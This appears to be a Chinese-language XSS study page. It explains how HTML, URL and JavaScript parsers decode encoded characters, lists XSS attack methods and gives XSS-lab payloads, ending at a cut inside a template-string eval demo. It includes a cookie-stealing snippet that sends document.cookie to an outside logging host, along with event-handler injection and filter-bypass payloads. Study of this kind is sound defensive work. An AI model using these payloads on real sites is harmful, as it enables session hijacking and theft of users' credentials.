&lt;p&gt;一个 HTML 解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个’&amp;lt;‘符号（后面没有跟’/&#39; 符号）就会进入 &lt;code&gt;“标签开始状态(Tag open state)”&lt;/code&gt; 。然后转变到 &lt;code&gt;“标签名状态(Tag name state)”&lt;/code&gt; ， &lt;code&gt;“前属性名状态(before attribute name state)”&lt;/code&gt; … 最后进入 &lt;code&gt;“数据状态(Data state)”&lt;/code&gt;  并释放当前标签的 token。当解析器处于 “数据状态 (Data state)” 时，它会继续解析，每当发现一个完整的标签，就会释放出一个 token。&lt;/p&gt;
&lt;p&gt;在 HTML 中有五类元素：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;空元素 (Void elements)，如&lt;area&gt;,&lt;base&gt;等等&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;原始文本元素 (Raw text elements)，有&lt;script&gt;和&lt;style&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;RCDATA 元素 (RCDATA elements)，有&lt;textarea&gt;和&lt;title&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;外部元素 (Foreign elements)，例如 MathML 命名空间或者 SVG 命名空间的元素&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基本元素 (Normal elements)，即除了以上 4 种元素以外的元素&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;五类元素的区别如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;原始文本元素，可以容纳文本。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;RCDATA 元素，可以容纳文本和字符引用。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;外部元素，可以容纳文本、字符引用、CDATA 段、其他元素和注释&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基本元素，可以容纳文本、字符引用、其他元素和注释&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;如果我们回头看 HTML 解析器的规则，其中有一种可以容纳字符引用的情况是 “RCDATA 状态中的字符引用”。这意味着在&lt;textarea&gt;和&lt;title&gt;标签中的字符引用会被 HTML 解析器解码。这里要再提醒一次，在解析这些字符引用的过程中不会进入 “标签开始状态”。这样就可以解释问题 5 了。另外，对 RCDATA 有个特殊的情况。在浏览器解析 RCDATA 元素的过程中，解析器会进入 “RCDATA 状态”。在这个状态中，如果遇到 “&amp;lt;” 字符，它会转换到 “RCDATA 小于号状态”。如果 “&amp;lt;” 字符后没有紧跟着 “/” 和对应的标签名，解析器会转换回 “RCDATA 状态”。这意味着在 RCDATA 元素标签的内容中（例如&lt;textarea&gt;或&lt;title&gt;的内容中），唯一能够被解析器认做是标签的就是 “&lt;/textarea&gt;” 或者 “&lt;/title&gt;”。因此，在 “&lt;textarea&gt;” 和 “&lt;title&gt;” 的内容中不会创建标签，就不会有脚本能够执行。这也就解释了为什么问题 6 中的脚本不会被执行。&lt;/p&gt;
&lt;h3 id=&#34;url解析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#url解析&#34;&gt;#&lt;/a&gt; URL 解析&lt;/h3&gt;
&lt;p&gt;首先，URL 资源类型必须是 ASCII 字母（U+0041-U+005A || U+0061-U+007A），不然就会进入 “无类型” 状态。例如， &lt;code&gt;你不能对协议类型进行任何的编码操作&lt;/code&gt; ，不然 URL 解析器会认为它无类型。这就是为什么问题 1 中的代码不能被执行。因为 URL 中被编码的 “javascript” 没有被解码，因此不会被 URL 解析器识别。该原则对协议后面的 “：”（冒号）同样适用，即问题 3 也得到解答。然而，你可能会想到：为什么问题 2 中的脚本被执行了呢？如果你记得我们在 HTML 解析部分讨论的内容的话，是否还记得有一个情况叫做 “属性值中的字符引用”，在这个情况中字符引用会被解码。我们将稍后讨论解析顺序，但在这里，HTML 解析器解析了文档，创建了标签 token，并且对 href 属性里的字符实体进行了解码。然后，当 HTML 解析器工作完成后，URL 解析器开始解析 href 属性值里的链接。在这时，“javascript” 协议已经被解码，它能够被 URL 解析器正确识别。然后 URL 解析器继续解析链接剩下的部分。由于是 “javascript” 协议，JavaScript 解析器开始工作并执行这段代码，这就是为什么问题 2 中的代码能够被执行。&lt;/p&gt;
&lt;h3 id=&#34;javascript解析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#javascript解析&#34;&gt;#&lt;/a&gt; JavaScript 解析&lt;/h3&gt;
&lt;p&gt;那像 “\uXXXX”（例如 \u0000,\u000A）这样的字符呢，JavaScript 会解析这些字符来执行吗？简单的说：视情况而定。具体的说就是要看被编码的序列到底是哪部分。首先，像 \uXXXX 一样的字符被称作 Unicode 转义序列。从上下文来看，你可以将转义序列放在 3 个部分：字符串中，标识符名称中和控制字符中。&lt;/p&gt;
&lt;p&gt;字符串中：当 Unicode 转义序列存在于字符串中时，它只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。这项内容清楚地写在 ECMAScript 中。因此，Unicode 转义序列将永远不会破环字符串上下文，因为它们只能被解释成字符串常量。&lt;/p&gt;
&lt;p&gt;标识符名称中：当 Unicode 转义序列出现在标识符名称中时，它会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。这可以用来解释问题 10。如果我们深入研究 JavaScript 细则，可以看到如下内容：&lt;/p&gt;
&lt;p&gt;“Unicode 转义序列（如 \u000A\u000B）同样被允许用在标识符名称中，被当作名称中的一个字符。而将’&#39; 符号前置在 Unicode 转义序列串（如 \u000A000B000C）并不能作为标识符名称中的字符。将 Unicode 转义序列串放在标识符名称中是非法的。”&lt;/p&gt;
&lt;p&gt;总的来说，Unicode 转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。如果我们回看问题 11，它并不会被执行。因为 “(11)” 不会被正确的解析，而 “alert (11)” 也不是一个有效的标识符名称。问题 12 不会被正确执行要么是因为’\u0031\u0032’不会被解释为字符串常量（因为它们没有用引号闭合）要么是因为它们是 ASCII 型数字。问题 13 不会执行的原因是’\u0027’仅仅会被解释成单引号文本，而此时字符串是未闭合的。问题 14 能够执行的原因是’\u000a’会被解释成换行符文本，这并不会导致真正的换行从而引发 JavaScript 语法错误。&lt;/p&gt;
&lt;p&gt;即 () 和 里面的东西都不能编码&lt;/p&gt;
&lt;h2 id=&#34;xss攻击方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss攻击方式&#34;&gt;#&lt;/a&gt; XSS 攻击方式&lt;/h2&gt;
&lt;h3 id=&#34;1读取浏览器cookie对象发起cookie劫持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1读取浏览器cookie对象发起cookie劫持&#34;&gt;#&lt;/a&gt; 1. 读取浏览器 cookie 对象，发起 cookie 劫持&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;var img = document.createElement(&amp;quot;img&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;img.src = &amp;quot;http://www.eval.com/log?&amp;quot; + escape(document.cookie);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;document.body.append(img);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用 httponly 标识可以防止 cookie 劫持&lt;/p&gt;
&lt;h3 id=&#34;2模拟postget请求操作用户的浏览器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2模拟postget请求操作用户的浏览器&#34;&gt;#&lt;/a&gt; 2. 模拟 POST，GET 请求操作用户的浏览器&lt;/h3&gt;
&lt;p&gt;在 cookie 劫持失效时或是在目标用户的网络不能访问互联网时&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.抓包分析浏览器发送的请求&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.构造完整url，使用XMLHTTPRequest或者form表单请求此url&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;3xss钓鱼&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3xss钓鱼&#34;&gt;#&lt;/a&gt; 3.XSS 钓鱼&lt;/h3&gt;
&lt;p&gt;通过伪造登录框获取用户的用户名和密码，在将密码和用户名发送到自己服务器上&lt;/p&gt;
&lt;h3 id=&#34;4获取用户信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4获取用户信息&#34;&gt;#&lt;/a&gt; 4. 获取用户信息&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.识别用户浏览器，根据每个浏览器特有的功能&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.识别用户安装的软件或浏览器插件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.查询用户访问过的连接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4.获取用户真实IP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;xsslab&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xsslab&#34;&gt;#&lt;/a&gt; XSSlab&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veHl6MzE1L3AvMTQ4NTAzNTkuaHRtbA==&#34;&gt;https://www.cnblogs.com/xyz315/p/14850359.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Level - 1&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;comment&#34;&gt;//192.168.1.6:18888/xss/level1.php?name=test&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?name=&amp;lt;script&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?name=&amp;lt;input onclick/onmouseover&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?name=&amp;lt;a onclick/javascript&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?name=&amp;lt;img src&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?name=&amp;lt;iframe&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?name=&amp;lt;svg&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?name=&amp;lt;video onloadstart=&lt;span class=&#34;title function_ invoke__&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) src=&lt;span class=&#34;string&#34;&gt;&amp;quot;/media/hack-the-plant.mp4&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;闭合 大小写 双写 编码&lt;/p&gt;
&lt;p&gt;Level 10&lt;/p&gt;
&lt;p&gt;?keyword=111&amp;amp;t_sort=1 type=“text” onclick=alert(1)&lt;/p&gt;
&lt;p&gt;?keyword=111&amp;amp;t_sort=1 type=“text” onfocus=alert(1) autofocus=&amp;quot;true&lt;/p&gt;
&lt;p&gt;Level 11&lt;/p&gt;
&lt;p&gt;Post 提交 referer&lt;/p&gt;
&lt;h2 id=&#34;模板字符串&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#模板字符串&#34;&gt;#&lt;/a&gt; 模板字符串&lt;/h2&gt;
&lt;figure class=&#34;highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//弹窗，因为有tostring方法，把数组中第一个参数转为字符串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alert&lt;span class=&#34;string&#34;&gt;`a`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;literal&#34;&gt;undefined&lt;/span&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//弹窗，因为有$&amp;#123;&amp;#125;执行表达式&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`&lt;span class=&#34;subst&#34;&gt;$&amp;#123;alert(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;#125;&lt;/span&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) [&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;attr&#34;&gt;raw&lt;/span&gt;: &lt;span class=&#34;title class_&#34;&gt;Array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//弹窗，相当于2前后加了个字符串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`a&lt;span class=&#34;subst&#34;&gt;$&amp;#123;alert(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;#125;&lt;/span&gt;b`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) [&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;attr&#34;&gt;raw&lt;/span&gt;: &lt;span class=&#34;title class_&#34;&gt;Array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//不弹，因为没有tostring，会放在数组中输出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`a`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;attr&#34;&gt;raw&lt;/span&gt;: &lt;span class=&#34;title class_&#34;&gt;Array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//不弹，和上一条一样&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`alert(1)`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;alert(1)&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;attr&#34;&gt;raw&lt;/span&gt;: &lt;span class=&#34;title class_&#34;&gt;Array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//弹窗，和3一样&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`alert(1) &lt;span class=&#34;subst&#34;&gt;$&amp;#123;alert(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&amp;#125;&lt;/span&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) [&lt;span class=&#34;string&#34;&gt;&amp;#x27;alert(1) &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;attr&#34;&gt;raw&lt;/span&gt;: &lt;span class=&#34;title class_&#34;&gt;Array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//弹窗，此时不是模板字符串，是函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//不弹，虽然有$&amp;#123;&amp;#125;执行表达式，但此时alert是字符串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;`&lt;span class=&#34;subst&#34;&gt;$&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;alert(1)&amp;#x27;&lt;/span&gt;&amp;#125;&lt;/span&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span 